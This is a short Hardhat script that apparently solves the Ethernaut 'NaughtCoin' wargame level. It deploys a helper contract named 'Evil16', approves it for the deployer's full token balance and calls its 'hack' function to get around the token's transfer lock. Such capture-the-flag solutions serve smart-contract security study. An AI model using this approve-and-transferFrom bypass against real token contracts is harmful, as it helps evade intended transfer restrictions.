import { ethers } from "hardhat";
import { Evil16__factory, NaughtCoin__factory } from "../typechain-types";

async function main() {
  let [deployer] = await ethers.getSigners();
  let tx;
  let contract = "0x5E747E4E31C070910CA53272d5541C0cB977533b";

  let naught_coin = new NaughtCoin__factory(deployer).attach(contract);
  let evil = await new Evil16__factory(deployer).deploy(contract);

  let amount = await naught_coin.balanceOf(deployer.address);

  tx = await naught_coin.approve(evil.address, amount);
  await tx.wait();

  tx = await evil.hack(amount);
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
